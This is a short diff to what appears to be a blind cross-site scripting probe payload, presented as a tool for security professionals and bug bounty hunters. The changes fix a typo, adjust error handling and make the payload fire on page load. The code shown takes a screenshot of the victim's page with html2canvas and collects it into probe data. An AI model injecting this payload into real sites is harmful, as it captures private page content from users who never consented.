@@ -20,7 +20,7 @@ $$ |      $$ |\$$$$$$$\ \$$$$$$$ |$$$$$$$  |\$$$$$$$\       $$ |  $$ |\$$$$$$$\ 
 
 This is a payload to test for Cross-site Scripting (XSS). It is meant to be used by security professionals and bug bounty hunters.
 
-If you believe that this payload has been used to attempt to comprimise your service without permission, please contact us.
+If you believe that this payload has been used to attempt to compromise your service without permission, please contact us.
 */
 
 // https://github.com/niklasvh/html2canvas
@@ -216,7 +216,7 @@ function hook_load_if_not_ready() {
         html2canvas(document.body).then(function(canvas) {
             probe_return_data['screenshot'] = canvas.toDataURL();
             finishing_moves();
-        }).catch(function() {
+        },function() {
             probe_return_data['screenshot'] = '';
             finishing_moves();
         });
@@ -237,5 +237,7 @@ function finishing_moves() {
 if( document.readyState == "complete" ) {
     hook_load_if_not_ready();
 } else {
-    setTimeout(hook_load_if_not_ready(), 6666);
+    addEvent( window, "load", function(){
+        hook_load_if_not_ready();
+    });
 }
